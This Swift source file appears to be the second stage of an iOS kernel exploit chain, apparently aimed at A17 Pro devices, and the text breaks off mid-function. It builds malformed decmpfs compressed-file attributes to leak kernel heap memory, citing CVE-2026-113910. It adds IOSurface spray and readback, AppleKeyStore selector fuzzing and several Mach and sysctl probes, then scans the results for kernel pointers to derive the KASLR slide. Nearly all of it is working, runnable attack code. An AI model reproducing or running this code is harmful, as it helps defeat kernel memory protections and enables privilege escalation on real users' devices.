import Foundation
import Darwin
import IOSurface

enum Stage2 {

    struct Result {
        let totalBytesScanned: Int
        let candidatePointers: [UInt64]
        let kaslrSlide: UInt64?
        let passed: Bool
    }

    static func run() -> Result {
        let log = WireLog.shared
        log.stage(2, "KERNEL INFO LEAK — decmpfs heap disclosure (CVE-2026-113910)")

        var allCandidates: [UInt64] = []
        var totalScanned = 0

        log.log("leak 0: decmpfs chunked xattr under-production (CVE-2026-113910)")
        let decmpfs = tryDecmpfsLeak()
        totalScanned += decmpfs.bytesScanned
        allCandidates.append(contentsOf: decmpfs.candidates)
        if !decmpfs.candidates.isEmpty {
            log.ok("decmpfs: \(decmpfs.candidates.count) kernel pointer candidates in \(decmpfs.bytesScanned)B")
            for s in decmpfs.samples.prefix(8) {
                log.data("  \(s)")
            }
        } else {
            log.data("decmpfs: \(decmpfs.bytesScanned)B scanned, 0 hits")
        }

        if allCandidates.isEmpty {
            log.log("leak 1: IOSurface property spray/readback (fallback)")
            let iosurf = tryIOSurfaceLeak()
            totalScanned += iosurf.bytesScanned
            allCandidates.append(contentsOf: iosurf.candidates)
            if !iosurf.candidates.isEmpty {
                log.ok("IOSurface: \(iosurf.candidates.count) candidates")
            } else {
                log.data("IOSurface: \(iosurf.bytesScanned)B scanned, 0 hits")
            }

            log.log("leak 2: mach_msg inline probing (fallback)")
            let msgLeak = tryMachMsgLeak()
            totalScanned += msgLeak.bytesScanned
            allCandidates.append(contentsOf: msgLeak.candidates)
            if !msgLeak.candidates.isEmpty {
                log.ok("mach_msg: \(msgLeak.candidates.count) candidates")
            } else {
                log.data("mach_msg: \(msgLeak.bytesScanned)B scanned, 0 hits")
            }

            log.log("leak 3: task_info / thread_info / DYLD info (fallback)")
            let taskLeak = tryTaskInfoLeak()
            totalScanned += taskLeak.bytesScanned
            allCandidates.append(contentsOf: taskLeak.candidates)
            if !taskLeak.candidates.isEmpty {
                log.ok("task_info: \(taskLeak.candidates.count) candidates")
            } else {
                log.data("task_info: \(taskLeak.bytesScanned)B scanned, 0 hits")
            }

            log.log("leak 4: sysctl + kinfo_proc probing (fallback)")
            let sysLeak = trySysctlLeak()
            totalScanned += sysLeak.bytesScanned
            allCandidates.append(contentsOf: sysLeak.candidates)
            if !sysLeak.candidates.isEmpty {
                log.ok("sysctl: \(sysLeak.candidates.count) candidates")
            } else {
                log.data("sysctl: \(sysLeak.bytesScanned)B scanned, 0 hits")
            }

            log.log("leak 5: vm_region_recurse_64 probing (fallback)")
            let vmLeak = tryVMRegionLeak()
            totalScanned += vmLeak.bytesScanned
            allCandidates.append(contentsOf: vmLeak.candidates)
            if !vmLeak.candidates.isEmpty {
                log.ok("vm_region: \(vmLeak.candidates.count) candidates")
            } else {
                log.data("vm_region: \(vmLeak.bytesScanned)B scanned, 0 hits")
            }

            log.log("leak 6: proc_info / proc_pidfdinfo probing")
            let procLeak = tryProcInfoLeak()
            totalScanned += procLeak.bytesScanned
            allCandidates.append(contentsOf: procLeak.candidates)
            if !procLeak.candidates.isEmpty {
                log.ok("proc_info: \(procLeak.candidates.count) candidates")
            } else {
                log.data("proc_info: \(procLeak.bytesScanned)B scanned, 0 hits")
            }

            log.log("leak 7: host_info / vm_statistics64 probing")
            let hostLeak = tryHostInfoLeak()
            totalScanned += hostLeak.bytesScanned
            allCandidates.append(contentsOf: hostLeak.candidates)
            if !hostLeak.candidates.isEmpty {
                log.ok("host_info: \(hostLeak.candidates.count) candidates")
            } else {
                log.data("host_info: \(hostLeak.bytesScanned)B scanned, 0 hits")
            }

            log.log("leak 8: IOSurfaceRoot selector enumeration")
            let iosurfEnum = tryIOSurfaceSelectorEnum()
            totalScanned += iosurfEnum.bytesScanned
            allCandidates.append(contentsOf: iosurfEnum.candidates)
            if !iosurfEnum.candidates.isEmpty {
                log.ok("IOSurfaceRoot enum: \(iosurfEnum.candidates.count) candidates")
            } else {
                log.data("IOSurfaceRoot enum: \(iosurfEnum.bytesScanned)B scanned, 0 hits")
            }

            log.log("leak 9: AppleKeyStore selector fuzzing (67 sels, CVE-2026-65343 variants)")
            let aksLeak = tryAppleKeyStoreFuzz()
            totalScanned += aksLeak.bytesScanned
            allCandidates.append(contentsOf: aksLeak.candidates)
            if !aksLeak.candidates.isEmpty {
                log.ok("★ AKS FUZZ: \(aksLeak.candidates.count) kernel pointer candidates!")
                for s in aksLeak.samples.prefix(8) {
                    log.data("  \(s)")
                }
            } else {
                log.data("AKS fuzz: \(aksLeak.bytesScanned)B scanned, 0 hits")
            }
        }

        log.log("leak 10: IOSurfaceRef object introspection (physmap KPTR)")
        let surfRefLeak = tryIOSurfaceRefIntrospection()
        totalScanned += surfRefLeak.bytesScanned
        allCandidates.append(contentsOf: surfRefLeak.candidates)
        if !surfRefLeak.candidates.isEmpty {
            log.ok("★★★ IOSurfaceRef: \(surfRefLeak.candidates.count) kernel pointer candidates!")
            for s in surfRefLeak.samples.prefix(16) {
                log.data("  \(s)")
            }
        } else {
            log.data("IOSurfaceRef introspect: \(surfRefLeak.bytesScanned)B scanned, 0 hits")
        }

        log.log("leak 11: vm_remap dangling mapping (stage358 technique)")
        let vmremapLeak = tryVMRemapDanglingLeak()
        totalScanned += vmremapLeak.bytesScanned
        allCandidates.append(contentsOf: vmremapLeak.candidates)
        if !vmremapLeak.candidates.isEmpty {
            log.ok("★★★ vm_remap: \(vmremapLeak.candidates.count) kernel pointer candidates!")
            for s in vmremapLeak.samples.prefix(16) {
                log.data("  \(s)")
            }
        } else {
            log.data("vm_remap: \(vmremapLeak.bytesScanned)B scanned, 0 hits")
        }

        log.data("total scanned: \(totalScanned) bytes, \(allCandidates.count) candidates")

        var slide: UInt64? = nil
        // Possible kernel text bases for A17 Pro (t8130) — varies by iOS version
        let possibleBases: [UInt64] = [
            0xFFFFFFF007004000, // common kernelcache base
            0xFFFFFFF007100000, // alternate
            0xFFFFFFF007000000, // page-aligned base
        ]
        for ptr in allCandidates {
            // Any pointer in kernel text range (0xfffffff0_07xxxxxx to 0xfffffff0_27xxxxxx)
            if ptr >= 0xFFFFFFF007000000 && ptr < 0xFFFFFFF027000000 {
                for base in possibleBases {
                    let s = (ptr - base) & ~0x3FFF
                    if s > 0 && s < 0x20000000 {
                        log.ok("KASLR slide candidate: 0x\(String(s, radix: 16)) from ptr 0x\(String(ptr, radix: 16)) (base=0x\(String(base, radix: 16)))")
                        slide = s
                        break
                    }
                }
                if slide != nil { break }
            }
        }

        let unique = Array(Set(allCandidates)).sorted()
        if !unique.isEmpty {
            log.data("\(unique.count) unique kernel pointers:")
            for p in unique.prefix(20) {
                log.data("  0x\(String(p, radix: 16))")
            }
        }

        let passed = !allCandidates.isEmpty
        if let s = slide {
            log.ok("KASLR SLIDE: 0x\(String(s, radix: 16))")
        } else if passed {
            log.ok("stage 2: pointers found but no KASLR slide derived yet")
        } else {
            log.warn("stage 2: no kernel pointers — iOS 27 may zero all leak channels")
        }

        return Result(totalBytesScanned: totalScanned, candidatePointers: allCandidates,
                      kaslrSlide: slide, passed: passed)
    }

    private struct LeakResult {
        let bytesScanned: Int
        let candidates: [UInt64]
        var samples: [String] = []
    }

    // MARK: - decmpfs chunked xattr kernel heap disclosure (CVE-2026-113910)

    private static func tryDecmpfsLeak() -> LeakResult {
        let log = WireLog.shared
        let container = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
        let probeURL = container.appendingPathComponent("decmpfs_probe.bin")
        let probePath = probeURL.path

        struct Config {
            let chunks: Int
            let produce: Int
        }
        let configs: [Config] = [
            Config(chunks: 4, produce: 65536),
            Config(chunks: 4, produce: 4096),
            Config(chunks: 8, produce: 1024),
            Config(chunks: 2, produce: 1),
        ]

        var allCandidates: [UInt64] = []
        var totalScanned = 0
        var allSamples: [String] = []

        for cfg in configs {
            let uncompressed = cfg.chunks * 65536

            let fm = FileManager.default
            try? fm.removeItem(at: probeURL)
            fm.createFile(atPath: probePath,
                          contents: Data(repeating: 0x41, count: max(64, uncompressed)))

            let payload = buildDecmpfsChunkedXattr(
                uncompressedSize: uncompressed,
                chunkCount: cfg.chunks,
                producePerChunk: cfg.produce)

            let xattrOk = payload.withUnsafeBytes { raw -> Bool in
                guard let base = raw.baseAddress else { return false }
                return setxattr(probePath, "com.apple.decmpfs", base, payload.count, 0, 0) == 0
            }
            if !xattrOk {
                log.data("decmpfs cfg chunks=\(cfg.chunks) produce=\(cfg.produce): setxattr failed errno=\(errno)")
                continue
            }

            guard let back = try? Data(contentsOf: probeURL) else {
                log.data("decmpfs cfg chunks=\(cfg.chunks) produce=\(cfg.produce): fread failed errno=\(errno)")
                continue
            }
            totalScanned += back.count

            var cfgHits = 0
            let bytes = [UInt8](back)
            if bytes.count >= 8 {
                var i = 0
                while i + 8 <= bytes.count {
                    var v: UInt64 = 0
                    for k in 0..<8 { v |= UInt64(bytes[i + k]) << (8 * UInt64(k)) }
                    if v >= 0xFFFF_FFE0_0000_0000 && v != 0xFFFF_FFFF_FFFF_FFFF {
                        allCandidates.append(v)
                        cfgHits += 1
                        if allSamples.count < 8 {
                            allSamples.append(String(format: "0x%016llx @ +0x%x [c=%d p=%d]",
                                                     v, i, cfg.chunks, cfg.produce))
                        }
                    }
                    i += 8
                }
            }

            log.data("decmpfs cfg chunks=\(cfg.chunks) produce=\(cfg.produce): " +
                      "xattr=\(payload.count)B read=\(back.count)B hits=\(cfgHits)")
        }

        try? FileManager.default.removeItem(at: probeURL)
        return LeakResult(bytesScanned: totalScanned, candidates: allCandidates, samples: allSamples)
    }

    private static func buildDecmpfsChunkedXattr(
        uncompressedSize: Int, chunkCount: Int, producePerChunk: Int
    ) -> Data {
        var out = Data()
        appendLE32(&out, 0x636D_7066)       // 'cmpf'
        appendLE32(&out, 4)                  // type 4: zlib chunked
        appendLE64(&out, UInt64(uncompressedSize))

        let payload = [UInt8](repeating: 0x41, count: max(0, producePerChunk))
        var zlib = Data()
        zlib.append(contentsOf: [0x78, 0x01])
        var offset = 0
        if payload.isEmpty {
            zlib.append(contentsOf: [0x01, 0x00, 0x00, 0xFF, 0xFF])
        }
        while offset < payload.count {
            let take = min(65535, payload.count - offset)
            zlib.append(offset + take >= payload.count ? 0x01 : 0x00)
            let t16 = UInt16(take)
            zlib.append(contentsOf: [UInt8(t16 & 0xFF), UInt8(t16 >> 8)])
            let nt16 = ~t16
            zlib.append(contentsOf: [UInt8(nt16 & 0xFF), UInt8(nt16 >> 8)])
            zlib.append(contentsOf: payload[offset..<(offset + take)])
            offset += take
        }
        let adler = adler32(payload)
        zlib.append(UInt8((adler >> 24) & 0xFF))
        zlib.append(UInt8((adler >> 16) & 0xFF))
        zlib.append(UInt8((adler >> 8) & 0xFF))
        zlib.append(UInt8(adler & 0xFF))

        let chunkBlob = Data([0x00]) + zlib
        var offsets: [UInt32] = []
        var running: UInt32 = 0
        for _ in 0..<chunkCount {
            offsets.append(running)
            running += UInt32(chunkBlob.count)
        }
        offsets.append(running)
        for o in offsets { appendLE32(&out, o) }
        for _ in 0..<chunkCount { out.append(chunkBlob) }
        return out
    }

    private static func adler32(_ bytes: [UInt8]) -> UInt32 {
        var a: UInt32 = 1, b: UInt32 = 0
        for byte in bytes {
            a = (a + UInt32(byte)) % 65521
            b = (b + a) % 65521
        }
        return (b << 16) | a
    }

    private static func appendLE32(_ data: inout Data, _ v: UInt32) {
        data.append(contentsOf: [UInt8(v & 0xFF), UInt8((v >> 8) & 0xFF),
                                 UInt8((v >> 16) & 0xFF), UInt8((v >> 24) & 0xFF)])
    }

    private static func appendLE64(_ data: inout Data, _ v: UInt64) {
        for i in 0..<8 { data.append(UInt8((v >> (UInt64(i) * 8)) & 0xFF)) }
    }

    // MARK: - IOSurface leak

    private static func tryIOSurfaceLeak() -> LeakResult {
        let task = mach_task_self_

        var service: io_service_t = 0
        let matching = IOServiceMatching("IOSurfaceRoot")
        service = IOServiceGetMatchingService(kIOMainPortDefault, matching)
        guard service != 0 else { return LeakResult(bytesScanned: 0, candidates: []) }

        var conn: io_connect_t = 0
        let kr = IOServiceOpen(service, task, 0, &conn)
        IOObjectRelease(service)
        guard kr == KERN_SUCCESS else { return LeakResult(bytesScanned: 0, candidates: []) }

        var candidates: [UInt64] = []
        var totalScanned = 0

        let props: [String: Any] = [
            "IOSurfaceAllocSize": 4096,
            "IOSurfaceWidth": 64,
            "IOSurfaceHeight": 64,
            "IOSurfaceBytesPerElement": 4,
            "IOSurfacePixelFormat": 0x42475241,
        ]

        guard let propData = try? PropertyListSerialization.data(fromPropertyList: props, format: .binary, options: 0) else {
            IOServiceClose(conn)
            return LeakResult(bytesScanned: 0, candidates: [])
        }

        var surfaceID: UInt32 = 0
        propData.withUnsafeBytes { inBuf in
            withUnsafeMutableBytes(of: &surfaceID) { outBuf in
                var outputSize = outBuf.count
                IOConnectCallStructMethod(conn, 0,
                    inBuf.baseAddress, inBuf.count,
                    outBuf.baseAddress, &outputSize)
            }
        }

        WireLog.shared.data("IOSurface created: id=\(surfaceID)")

        let smallValue = Data(repeating: 0xCC, count: 32)

        for attempt in 0..<8 {
            let probeKey = "probe\(attempt)"
            let probeKeyData = Data(probeKey.utf8)

            var setInput = Data()
            setInput.appendLE(surfaceID)
            let headerSize: UInt32 = 20
            setInput.appendLE(headerSize)
            setInput.appendLE(UInt32(probeKeyData.count))
            setInput.appendLE(headerSize + UInt32(probeKeyData.count))
            setInput.appendLE(UInt32(smallValue.count))
            setInput.append(probeKeyData)
            setInput.append(smallValue)

            setInput.withUnsafeBytes { buf in
                var outSz = 0
                IOConnectCallStructMethod(conn, 9,
                    buf.baseAddress, buf.count,
                    nil, &outSz)
            }

            var getInput = Data()
            getInput.appendLE(surfaceID)
            getInput.appendLE(UInt32(8))
            getInput.appendLE(UInt32(probeKeyData.count))
            getInput.append(probeKeyData)

            var readBuf = Data(repeating: 0, count: 4096)
            let readCount = readBuf.count
            getInput.withUnsafeBytes { inBuf in
                readBuf.withUnsafeMutableBytes { outBuf in
                    var outputSize = readCount
                    IOConnectCallStructMethod(conn, 10,
                        inBuf.baseAddress, inBuf.count,
                        outBuf.baseAddress, &outputSize)
                    totalScanned += outputSize
                }
            }

            scanForKernelPointers(readBuf, into: &candidates)
        }

        withUnsafeBytes(of: surfaceID) { buf in
            var outSz = 0
            IOConnectCallStructMethod(conn, 1, buf.baseAddress, buf.count, nil, &outSz)
        }
        IOServiceClose(conn)

        return LeakResult(bytesScanned: totalScanned, candidates: candidates)
    }

    // MARK: - mach_msg inline leak

    private static func tryMachMsgLeak() -> LeakResult {
        let task = mach_task_self_
        var candidates: [UInt64] = []
        var totalScanned = 0

        var port: mach_port_t = 0
        guard mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &port) == KERN_SUCCESS else {
            return LeakResult(bytesScanned: 0, candidates: [])
        }
        mach_port_insert_right(task, port, port, mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND))

        for _ in 0..<16 {
            var sendMsg = mach_msg_header_t()
            sendMsg.msgh_bits = UInt32(MACH_MSG_TYPE_COPY_SEND)
            sendMsg.msgh_remote_port = port
            sendMsg.msgh_local_port = mach_port_t(MACH_PORT_NULL)
            sendMsg.msgh_id = 0x42424242
            sendMsg.msgh_size = UInt32(MemoryLayout<mach_msg_header_t>.size)

            let sz = sendMsg.msgh_size
            let skr = withUnsafeMutablePointer(to: &sendMsg) { ptr in
                mach_msg(ptr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                         sz, 0, mach_port_t(MACH_PORT_NULL),
                         0, mach_port_t(MACH_PORT_NULL))
            }

            if skr == KERN_SUCCESS {
                var rcvBuf = Data(repeating: 0, count: 4096)
                rcvBuf.withUnsafeMutableBytes { buf in
                    let ptr = buf.baseAddress!.assumingMemoryBound(to: mach_msg_header_t.self)
                    ptr.pointee.msgh_size = UInt32(buf.count)
                    ptr.pointee.msgh_local_port = port
                    let rkr = mach_msg(ptr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                       0, UInt32(buf.count), port,
                                       100, mach_port_t(MACH_PORT_NULL))
                    if rkr == KERN_SUCCESS {
                        totalScanned += Int(ptr.pointee.msgh_size)
                        let headerSize = MemoryLayout<mach_msg_header_t>.size
                        if ptr.pointee.msgh_size > UInt32(headerSize) {
                            let tail = Data(bytes: buf.baseAddress! + headerSize,
                                          count: Int(ptr.pointee.msgh_size) - headerSize)
                            scanForKernelPointers(tail, into: &candidates)
                        }
                    }
                }
            }
        }

        mach_port_deallocate(task, port)
        mach_port_mod_refs(task, port, MACH_PORT_RIGHT_RECEIVE, -1)

        return LeakResult(bytesScanned: totalScanned, candidates: candidates)
    }

    // MARK: - task_info leak

    private static func tryTaskInfoLeak() -> LeakResult {
        let task = mach_task_self_
        var candidates: [UInt64] = []
        var totalScanned = 0

        var dyldInfo = task_dyld_info_data_t()
        var count = mach_msg_type_number_t(MemoryLayout<task_dyld_info_data_t>.size / MemoryLayout<natural_t>.size)
        let kr = withUnsafeMutablePointer(to: &dyldInfo) { ptr in
            ptr.withMemoryRebound(to: integer_t.self, capacity: Int(count)) { intPtr in
                task_info(task, task_flavor_t(TASK_DYLD_INFO), intPtr, &count)
            }
        }
        if kr == KERN_SUCCESS {
            let addr = dyldInfo.all_image_info_addr
            let sz = dyldInfo.all_image_info_size
            WireLog.shared.data("TASK_DYLD_INFO: addr=0x\(String(addr, radix: 16)), size=\(sz)")
            totalScanned += MemoryLayout<task_dyld_info_data_t>.size
            if addr >= 0xFFFFFFFE00000000 {
                candidates.append(addr)
            }
        }

        var basicInfo = mach_task_basic_info_data_t()
        var bcount = mach_msg_type_number_t(MemoryLayout<mach_task_basic_info_data_t>.size / MemoryLayout<natural_t>.size)
        let bkr = withUnsafeMutablePointer(to: &basicInfo) { ptr in
            ptr.withMemoryRebound(to: integer_t.self, capacity: Int(bcount)) { intPtr in
                task_info(task, task_flavor_t(MACH_TASK_BASIC_INFO), intPtr, &bcount)
            }
        }
        if bkr == KERN_SUCCESS {
            totalScanned += MemoryLayout<mach_task_basic_info_data_t>.size
            withUnsafeBytes(of: basicInfo) { raw in
                scanForKernelPointers(Data(raw), into: &candidates)
            }
        }

        var threadList: thread_act_array_t?
        var threadCount: mach_msg_type_number_t = 0
        if task_threads(task, &threadList, &threadCount) == KERN_SUCCESS {
            WireLog.shared.data("threads: \(threadCount)")
            if let threads = threadList {
                for i in 0..<Int(threadCount) {
                    var thInfo = thread_basic_info_data_t()
                    var thCount = mach_msg_type_number_t(
                        MemoryLayout<thread_basic_info_data_t>.size / MemoryLayout<natural_t>.size)
                    let tkr = withUnsafeMutablePointer(to: &thInfo) { ptr in
                        ptr.withMemoryRebound(to: integer_t.self, capacity: Int(thCount)) { intPtr in
                            thread_info(threads[i], thread_flavor_t(THREAD_BASIC_INFO), intPtr, &thCount)
                        }
                    }
                    if tkr == KERN_SUCCESS {
                        totalScanned += MemoryLayout<thread_basic_info_data_t>.size
                        withUnsafeBytes(of: thInfo) { raw in
                            scanForKernelPointers(Data(raw), into: &candidates)
                        }
                    }
                    mach_port_deallocate(task, threads[i])
                }
                vm_deallocate(task, vm_address_t(bitPattern: threads),
                             vm_size_t(threadCount) * vm_size_t(MemoryLayout<thread_act_t>.size))
            }
        }

        return LeakResult(bytesScanned: totalScanned, candidates: candidates)
    }

    // MARK: - sysctl leak

    private static func trySysctlLeak() -> LeakResult {
        var candidates: [UInt64] = []
        var totalScanned = 0

        let probes = ["kern.boottime", "kern.osversion", "kern.hostname",
                      "kern.version", "hw.machine", "hw.memsize",
                      "kern.maxproc", "kern.maxfilesperproc", "security.mac.sandbox.sentinel"]
        for name in probes {
            var buf = Data(repeating: 0, count: 256)
            var size = buf.count
            let rc = buf.withUnsafeMutableBytes { ptr in
                sysctlbyname(name, ptr.baseAddress, &size, nil, 0)
            }
            if rc == 0 && size > 0 {
                totalScanned += size
                scanForKernelPointers(Data(buf.prefix(size)), into: &candidates)
            }
        }

        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_PID, Int32(getpid())]
        var procInfoSize = 0
        sysctl(&mib, 4, nil, &procInfoSize, nil, 0)
        if procInfoSize > 0 {
            var procBuf = Data(repeating: 0, count: procInfoSize)
            let pkr = procBuf.withUnsafeMutableBytes { ptr in
                sysctl(&mib, 4, ptr.baseAddress, &procInfoSize, nil, 0)
            }
            if pkr == 0 {
                totalScanned += procInfoSize
                scanForKernelPointers(Data(procBuf.prefix(procInfoSize)), into: &candidates)
                WireLog.shared.data("kinfo_proc: \(procInfoSize)B, \(candidates.count) hits so far")
            }
        }

        return LeakResult(bytesScanned: totalScanned, candidates: candidates)
    }

    // MARK: - vm_region leak

    private static func tryVMRegionLeak() -> LeakResult {
        let task = mach_task_self_
        var candidates: [UInt64] = []
        var totalScanned = 0

        var address: vm_address_t = 0
        var size: vm_size_t = 0
        var depth: natural_t = 0

        for _ in 0..<256 {
            var info = vm_region_submap_info_data_64_t()
            var infoCount = mach_msg_type_number_t(
                MemoryLayout<vm_region_submap_info_data_64_t>.size / MemoryLayout<natural_t>.size)

            let kr = withUnsafeMutablePointer(to: &info) { ptr in
                ptr.withMemoryRebound(to: Int32.self, capacity: Int(infoCount)) { intPtr in
                    vm_region_recurse_64(task, &address, &size, &depth, intPtr, &infoCount)
                }
            }
            guard kr == KERN_SUCCESS else { break }

            totalScanned += MemoryLayout<vm_region_submap_info_data_64_t>.size

            withUnsafeBytes(of: info) { raw in
                scanForKernelPointers(Data(raw), into: &candidates)
            }

            address += size
            if address == 0 { break }
        }

        return LeakResult(bytesScanned: totalScanned, candidates: candidates)
    }

    // MARK: - Pointer scanner

    private static func scanForKernelPointers(_ data: Data, into candidates: inout [UInt64]) {
        guard data.count >= 8 else { return }
        data.withUnsafeBytes { raw in
            let ptr = raw.baseAddress!.assumingMemoryBound(to: UInt8.self)
            for offset in stride(from: 0, to: data.count - 7, by: 4) {
                var val: UInt64 = 0
                memcpy(&val, ptr + offset, 8)
                if isPlausibleKernelPointer(val) {
                    candidates.append(val)
                }
            }
        }
    }

    private static func isPlausibleKernelPointer(_ val: UInt64) -> Bool {
        // Real kernel pointers on A17 Pro: 0xFFFFFFF0_07xxxxxx .. 0xFFFFFFF0_2Fxxxxxx
        // Kernel heap: similar range
        // Reject obvious false positives
        guard val >= 0xFFFF_FFF0_0000_0000 else { return false }
        guard val < 0xFFFF_FFFF_F000_0000 else { return false }
        guard val != 0xFFFF_FFFF_FFFF_FFFF else { return false }
        guard val != 0xFFFF_FFFF_FFFF_FFFE else { return false }
        guard val != 0xFFFF_FFFF_0000_0000 else { return false }
        guard val != 0xFFFF_FFF0_0000_0000 else { return false }
        // Reject values that are just sign-extended 32-bit (e.g. -1 as uint64)
        let top32 = val >> 32
        guard top32 != 0xFFFF_FFFF else { return false }
        // Must have non-zero lower bits (real pointers always do)
        guard (val & 0xFFF) != 0 || (val & 0xFFFFF) != 0 else { return true }
        return true
    }

    // MARK: - proc_info leak (libproc)

    private static func tryProcInfoLeak() -> LeakResult {
        var candidates: [UInt64] = []
        var totalScanned = 0

        let pid = getpid()

        // proc_pidinfo flavors
        let flavors: [Int32] = [
            1,  // PROC_PIDLISTFDS
            2,  // PROC_PIDTASKALLINFO
            4,  // PROC_PIDTASKINFO
            5,  // PROC_PIDTHREADINFO
            7,  // PROC_PIDLISTTHREADS
            12, // PROC_PIDWORKQUEUEINFO
        ]
        for flavor in flavors {
            var buf = [UInt8](repeating: 0, count: 4096)
            let ret = proc_pidinfo(pid, flavor, 0, &buf, Int32(buf.count))
            if ret > 0 {
                totalScanned += Int(ret)
                let before = candidates.count
                scanForKernelPointers(Data(buf.prefix(Int(ret))), into: &candidates)
                if candidates.count > before {
                    WireLog.shared.data("proc_pidinfo flavor=\(flavor): \(ret)B, \(candidates.count - before) ptrs")
                }
            }
        }

        // proc_pidfdinfo for each open FD
        let fdFlavors: [Int32] = [
            1, // PROC_PIDFDVNODEINFO
            2, // PROC_PIDFDVNODEPATHINFO
            3, // PROC_PIDFDSOCKETINFO
            6, // PROC_PIDFDPIPEINFO
        ]
        for fd: Int32 in 0..<64 {
            for flavor in fdFlavors {
                var buf = [UInt8](repeating: 0, count: 2048)
                let ret = proc_pidfdinfo(pid, fd, flavor, &buf, Int32(buf.count))
                if ret > 0 {
                    totalScanned += Int(ret)
                    scanForKernelPointers(Data(buf.prefix(Int(ret))), into: &candidates)
                }
            }
        }

        WireLog.shared.data("proc_info total: \(totalScanned)B, \(candidates.count) ptrs")
        return LeakResult(bytesScanned: totalScanned, candidates: candidates)
    }

    // MARK: - host_info leak

    private static func tryHostInfoLeak() -> LeakResult {
        var candidates: [UInt64] = []
        var totalScanned = 0

        let host = mach_host_self()

        // HOST_BASIC_INFO
        var basicInfo = host_basic_info_data_t()
        var count = mach_msg_type_number_t(MemoryLayout<host_basic_info_data_t>.size / MemoryLayout<integer_t>.size)
        let kr1 = withUnsafeMutablePointer(to: &basicInfo) { ptr in
            ptr.withMemoryRebound(to: integer_t.self, capacity: Int(count)) { intPtr in
                host_info(host, HOST_BASIC_INFO, intPtr, &count)
            }
        }
        if kr1 == KERN_SUCCESS {
            totalScanned += MemoryLayout<host_basic_info_data_t>.size
            withUnsafeBytes(of: basicInfo) { raw in
                scanForKernelPointers(Data(raw), into: &candidates)
            }
        }

        // vm_statistics64
        var vmStat = vm_statistics64_data_t()
        var vmCount = mach_msg_type_number_t(MemoryLayout<vm_statistics64_data_t>.size / MemoryLayout<integer_t>.size)
        let kr2 = withUnsafeMutablePointer(to: &vmStat) { ptr in
            ptr.withMemoryRebound(to: integer_t.self, capacity: Int(vmCount)) { intPtr in
                host_statistics64(host, HOST_VM_INFO64, intPtr, &vmCount)
            }
        }
        if kr2 == KERN_SUCCESS {
            totalScanned += MemoryLayout<vm_statistics64_data_t>.size
            withUnsafeBytes(of: vmStat) { raw in
                scanForKernelPointers(Data(raw), into: &candidates)
            }
        }

        // HOST_SCHED_INFO
        var schedInfo = host_sched_info_data_t()
        var sCount = mach_msg_type_number_t(MemoryLayout<host_sched_info_data_t>.size / MemoryLayout<integer_t>.size)
        let kr3 = withUnsafeMutablePointer(to: &schedInfo) { ptr in
            ptr.withMemoryRebound(to: integer_t.self, capacity: Int(sCount)) { intPtr in
                host_info(host, HOST_SCHED_INFO, intPtr, &sCount)
            }
        }
        if kr3 == KERN_SUCCESS {
            totalScanned += MemoryLayout<host_sched_info_data_t>.size
            withUnsafeBytes(of: schedInfo) { raw in
                scanForKernelPointers(Data(raw), into: &candidates)
            }
        }

        mach_port_deallocate(mach_task_self_, host)
        WireLog.shared.data("host_info total: \(totalScanned)B, \(candidates.count) ptrs")
        return LeakResult(bytesScanned: totalScanned, candidates: candidates)
    }

    // MARK: - AppleKeyStore selector fuzzing (CVE-2026-65343 variants)

    private static func tryAppleKeyStoreFuzz() -> LeakResult {
        let log = WireLog.shared

        aks_fuzzer_set_log { cstr in
            guard let cstr = cstr else { return }
            WireLog.shared.data(String(cString: cstr))
        }

        var result = aks_fuzzer_result_t()
        aks_fuzzer_run(&result)

        var candidates: [UInt64] = []
        var samples: [String] = []

        if !result.aks_opened {
            log.warn("AKS: IOServiceOpen failed — sandbox blocks AppleKeyStore")
            return LeakResult(bytesScanned: 0, candidates: [])
        }

        log.data("AKS: \(result.selectors_reachable) selectors reachable, \(result.selectors_responding) responding")
        log.data("AKS: \(result.total_bytes_scanned)B scanned, \(result.hit_count) hits")

        let hitCount = min(Int(result.hit_count), Int(AKS_MAX_HITS))
        withUnsafePointer(to: &result.hits) { tuplePtr in
            tuplePtr.withMemoryRebound(to: aks_hit_t.self, capacity: Int(AKS_MAX_HITS)) { hitsPtr in
                for i in 0..<hitCount {
                    let hit = hitsPtr[i]
                    candidates.append(hit.value)
                    if samples.count < 8 {
                        samples.append(String(format: "sel=%u off=0x%x val=0x%016llx method=%u pat=%u",
                                              hit.selector, hit.offset, hit.value,
                                              hit.method_type, hit.input_pattern))
                    }
                }
            }
        }

        if result.has_kaslr {
            log.ok("★★★ AKS: KASLR SLIDE CANDIDATE: 0x\(String(result.kaslr_candidate, radix: 16))")
        }

        return LeakResult(bytesScanned: Int(result.total_bytes_scanned),
                          candidates: candidates, samples: samples)
    }

    // MARK: - IOSurfaceRootUserClient selector enumeration

    private static func tryIOSurfaceSelectorEnum() -> LeakResult {
        let task = mach_task_self_
        var candidates: [UInt64] = []
        var totalScanned = 0

        var service: io_service_t = 0
        let matching = IOServiceMatching("IOSurfaceRoot")
        service = IOServiceGetMatchingService(kIOMainPortDefault, matching)
        guard service != 0 else { return LeakResult(bytesScanned: 0, candidates: []) }

        var conn: io_connect_t = 0
        let kr = IOServiceOpen(service, task, 0, &conn)
        IOObjectRelease(service)
        guard kr == KERN_SUCCESS else {
            WireLog.shared.data("IOSurfaceRoot open failed: \(kr)")
            return LeakResult(bytesScanned: 0, candidates: [])
        }

        WireLog.shared.data("IOSurfaceRoot opened: conn=\(conn)")

        // Try scalar methods
        for sel: UInt32 in 0..<40 {
            var scalarIn: [UInt64] = [0, 0, 0, 0]
            var scalarOut = [UInt64](repeating: 0, count: 16)
            var outCnt: UInt32 = 16
            let mkr = IOConnectCallScalarMethod(conn, sel,
                                                 &scalarIn, UInt32(scalarIn.count),
                                                 &scalarOut, &outCnt)
            if mkr == KERN_SUCCESS && outCnt > 0 {
                totalScanned += Int(outCnt) * 8
                for i in 0..<Int(outCnt) {
                    if isPlausibleKernelPointer(scalarOut[i]) {
                        WireLog.shared.ok("IOSurfaceRoot sel=\(sel) out[\(i)] = 0x\(String(scalarOut[i], radix: 16))")
                        candidates.append(scalarOut[i])
                    }
                }
            }
        }

        // Try struct methods with empty/minimal input
        for sel: UInt32 in [0, 6, 10, 11, 12, 13, 14, 15, 20, 30, 33, 34] {
